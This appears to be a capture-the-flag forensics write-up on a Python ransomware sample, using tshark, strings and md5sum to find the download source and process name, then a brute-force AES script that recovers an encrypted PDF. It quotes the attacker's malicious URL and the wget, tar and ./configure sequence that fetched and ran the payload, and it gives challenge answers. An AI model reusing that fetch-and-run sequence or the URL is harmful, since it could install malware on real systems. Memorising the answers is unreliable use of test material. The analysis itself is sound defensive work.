> *Which is the malicious URL that the ransomware was downloaded from?*
> 

the server used plain HTTP but the pcap has only TCP, try:

```bash
# 1C: show any packet payload containing "GET "
tshark -r poof_capture.pcap -Y 'tcp contains "GET "' -V
```

<img width="1457" height="695" alt="image" src="https://github.com/user-attachments/assets/e973465e-9f5e-4471-a850-e80663ffe670" />

<img width="1493" height="360" alt="image" src="https://github.com/user-attachments/assets/03e5ff14-9d4f-4d6e-b05c-cc057d70c660" />

Malicious URL

The ransomware was downloaded from:

`http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz`

> *What is the name of the malicious process?*
> 

## Fast text-searchs in the memory dump (quick and often enough)

Run these first — they’re fast and often reveal the exact command line that launched the downloader (so you’ll directly see the process name).

1. Search for the domain / filename and `Wget` user-agent strings we saw:

```bash
# Find any occurrence of the filename or host in memory
strings -a mem.dmp | egrep -i 'pygaming-dev|pygaming-dev-13.37|files.pypi-install.com' -n -C3
```

<img width="1490" height="651" alt="image" src="https://github.com/user-attachments/assets/6164d92c-3c15-49e4-ba9c-ab5ec3d05bd1" />

1. **`wget`** was used to fetch the payload:
    
    ```
    wget http://files.pypi-install.com/.../pygaming-dev-13.37.tar.gz
    ```
    
    (multiple hits in memory at offsets like `780487`, `965380`, `3612404`).
    
2. The tarball was extracted:
    
    ```
    tar -xf pygaming-dev-13.37.tar.gz
    ```
    
3. The user then executed:
    
    ```
    ./configure
    ```
    
     which is actually the **malicious binary** inside the archive.
    
4. Memory shows PyInstaller artifacts (`_MEIPASS2`, `_PYI_PROCNAME=configure`), which is how Python malware often bundles itself. That means the ransomware itself ran under the process name **`configure`**.
5. Answer The name of the malicious process is: **`configure`**

---

> *Provide the md5sum of the ransomware file.*
> 

### Create the output directory

```bash
mkdir extracted
```

---

### Extract the tarball

```bash
tar -xvf http_objects/pygaming-dev-13.37.tar.gz -C extracted/
```

This will unpack everything into `./extracted/`.

---

### Verify contents

```bash
ls -lh extracted/
ls -lh extracted/pygaming-dev-13.37
```

You should see files like `configure`, `game.py`, etc.

---

### Compute MD5 hash of the malicious binary

```bash
md5sum extracted/pygaming-dev-13.37/configure
```

<img width="1485" height="439" alt="image" src="https://github.com/user-attachments/assets/1f8017bb-8648-444f-b23f-213a1dc6dd20" />

Answer:**c010fb1fdf8315bc442c334886804e00** 

> *Which programming language was used to develop the ransomware? (for example: nim)*
> 

## Check with `file`

Run:

```bash
file extracted/pygaming-dev-13.37/configure
```

- If it says something like **ELF 64-bit LSB executable, dynamically linked**, that’s just the container.
- Sometimes PyInstaller binaries still show Python hints here.

Strings search

Check if it contains Python runtime artifacts:

```bash
strings extracted/pygaming-dev-13.37/configure | egrep -i "python|pyi|pyinstaller|libpython"
```

<img width="1494" height="665" alt="image" src="https://github.com/user-attachments/assets/530323ac-9c0c-458a-a164-5c12743a2882" />

Answer: **Python**

> *After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption)*
> 

Amswer:**mv18jiVh6TJI9lzY**

> *Decrypt the given file, and provide its md5sum.*
> 

Save this as `try_decrypt_variants.py` next to your `candy_dungeon.pdf.boo`, install pycryptodome if needed (`pip3 install pycryptodome`), then run:

```bash
python3 try_decrypt_variants.py candy_dungeon.pdf.boo vN0nb7ZshjAWiCzv ffTC776Wt59Qawe1
```

(You can omit the last two args — defaults are the values you posted.)

---

### Script — `try_decrypt_variants.py`

```python
#!/usr/bin/env python3
# try_decrypt_variants.py
# Usage: python3 try_decrypt_variants.py <encfile> [key_string] [iv_string]
# Example: python3 try_decrypt_variants.py candy_dungeon.pdf.boo vN0nb7ZshjAWiCzv ffTC776Wt59Qawe1

import sys, os, hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

if len(sys.argv) < 2:
    print("Usage: python3 try_decrypt_variants.py <encfile> [key_string] [iv_string]")
    sys.exit(1)

enc_path = sys.argv[1]
key_str = sys.argv[2] if len(sys.argv) > 2 else "vN0nb7ZshjAWiCzv"
iv_str  = sys.argv[3] if len(sys.argv) > 3 else "ffTC776Wt59Qawe1"

data = open(enc_path, "rb").read()
print("[*] Encrypted file:", enc_path, "size:", len(data))

# Build key candidates (bytes)
def mkbytes(s):
    try:
        return s.encode("utf-8")
    except:
        return bytes(s)

k0 = key_str
key_candidates = []
kbytes = mkbytes(k0)
key_candidates.append(kbytes)                      # direct utf-8
# padded/truncated forms
for L in (16,24,32):
    if len(kbytes) >= L:
        key_candidates.append(kbytes[:L])
    else:
        key_candidates.append(kbytes.ljust(L, b'\x00'))
# hash-derived keys
key_candidates.append(hashlib.md5(kbytes).digest())   # 16
key_candidates.append(hashlib.sha1(kbytes).digest()[:16])
key_candidates.append(hashlib.sha256(kbytes).digest()[:16])
key_candidates.append(hashlib.sha256(kbytes).digest()[:32])
# if hex-looking, try hex decode
if all(c in "0123456789abcdefABCDEF" for c in key_str) and len(key_str) % 2 == 0:
    try:
        key_candidates.append(bytes.fromhex(key_str))
    except:
        pass

# unique them
uniq_keys = []
for k in key_candidates:
    if k not in uniq_keys:
        uniq_keys.append(k)
key_candidates = uniq_keys

print("[*] Key candidates:", [len(k) for k in key_candidates], "bytes lengths:", [len(k) for k in key_candidates])

# IV candidates
iv_candidates = []
iv_candidates.append(mkbytes(iv_str))           # provided iv string -> utf8
if len(data) >= 16:
    iv_candidates.append(data[:16])            # common: IV stored as first 16 bytes
    iv_candidates.append(data[:12] + b'\x00\x00\x00\x00')  # try 12+0 pad (for some CTR cases)
# zero IV
iv_candidates.append(b'\x00' * 16)
# make unique
uniq_iv = []
for v in iv_candidates:
    if v not in uniq_iv:
        uniq_iv.append(v)
iv_candidates = uniq_iv
print("[*] IV candidates lengths:", [len(v) for v in iv_candidates])

# modes/variants to try
variants = []

# AES CFB: try segment sizes 8 and 128 (bits)
variants.append(("CFB", {"mode":"CFB","seg":8}))
variants.append(("CFB", {"mode":"CFB","seg":128}))

# CBC, OFB
variants.append(("CBC", {"mode":"CBC"}))
variants.append(("OFB", {"mode":"OFB"}))

# CTR: use iv as counter initial value
variants.append(("CTR", {"mode":"CTR"}))

# Try decrypt attempts
found = []
def md5_of_bytes(b): return hashlib.md5(b).hexdigest()

for ik, key in enumerate(key_candidates):
    for iv in iv_candidates:
        for vname, params in variants:
            try:
                if params["mode"] == "CFB":
                    seg = params.get("seg", 8)
                    # PyCryptodome uses segment_size in bits (must be multiple of 8)
                    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=seg)
                    ct = data if iv != data[:16] else data[16:] if iv == data[:16] else data
                    pt = cipher.decrypt(ct)
                elif params["mode"] == "CBC":
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    ct = data if iv != data[:16] else data[16:]
                    pt = cipher.decrypt(ct)
                elif params["mode"] == "OFB":
                    cipher = AES.new(key, AES.MODE_OFB, iv)
                    ct = data if iv != data[:16] else data[16:]
                    pt = cipher.decrypt(ct)
                elif params["mode"] == "CTR":
                    # Counter using iv as initial value (128-bit)
                    # If iv shorter than 16 pad left with zeros
                    iv_norm = iv.rjust(16, b'\x00')[:16]
                    init = int.from_bytes(iv_norm, byteorder='big')
                    ctr = Counter.new(128, initial_value=init)
                    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                    ct = data if iv != data[:16] else data[16:]
                    pt = cipher.decrypt(ct)
                else:
                    continue

                # test for PDF header
                if pt.startswith(b"%PDF"):
                    out = f"{enc_path}.decrypted_{len(key)}_{len(iv)}_{vname}"
                    open(out, "wb").write(pt)
                    md5 = md5_of_bytes(pt)
                    print("\n[+] SUCCESS: mode:", vname, "key_len:", len(key), "iv_len:", len(iv))
                    print("    key(bytes hex):", key.hex()[:64], "...")
                    print("    iv(bytes hex): ", iv.hex()[:64], "...")
                    print("    wrote:", out, "md5:", md5)
                    found.append((out, md5, vname, key, iv))
                # additionally, some formats embed the IV as first 16 bytes and decrypted data may start with pdf only after skipping
                # (we already handled ct=data[16:] when iv==data[:16])
            except Exception as e:
                # ignore exceptions but print minor diagnostics optionally
                pass

# If nothing found, try small tweaks: XOR with key bytes (fallback)
if not found:
    print("\n[*] No PDF detected by AES variants. Trying fallback simple XOR using key string/bytes.")
    for key in key_candidates[:4]:
        outb = bytearray()
        for i, b in enumerate(data):
            outb.append(b ^ key[i % len(key)])
        if outb.startswith(b"%PDF"):
            out = enc_path + f".xor_{len(key)}.pdf"
            open(out, "wb").write(outb)
            print("[+] XOR produced PDF with key_len", len(key), "written:", out, "md5:", md5_of_bytes(outb))
            found.append((out, md5_of_bytes(outb), "XOR", key, None))

if not found:
    print("\n[!] No candidate produced a PDF header. Next steps:")
    print("  - verify the key/iv are correct")
    print("  - maybe the file has a header/salt that must be removed (e.g. first 16 bytes as salt/iv)")
    print("  - paste the function source (def mv18jiVh6TJI9lzY) if you haven't already: it reveals the exact algorithm and any key derivation")
    sys.exit(2)
else:
    print("\n[*] All successful candidates:")
    for out, md5, mode, key, iv in found:
        print("  ->", out, "md5:", md5, "mode:", mode, "key_len:", len(key) if key else None, "iv_len:", len(iv) if iv else None)
    sys.exit(0)

```

---

### What this does & why

- Tries AES CFB with both `segment_size=8` and `128` (CFB may be implemented with different segment sizes).
- Tries CBC, OFB, CTR (CTR uses the IV as the initial counter).
- If the file was written with the IV prefixed to the ciphertext (a common pattern), the script will attempt to treat the first 16 bytes of the file as IV (the script tests `iv == data[:16]` cases).
- Tries direct key, padded/truncated forms, MD5/SHA-based variants.
- If any decrypted output starts with `%PDF`, the script writes it and prints the MD5.

<img width="1301" height="248" alt="image" src="https://github.com/user-attachments/assets/76b9a77b-dbc6-4496-b241-1435ea1b9541" />

after submit it right away you get the flag.
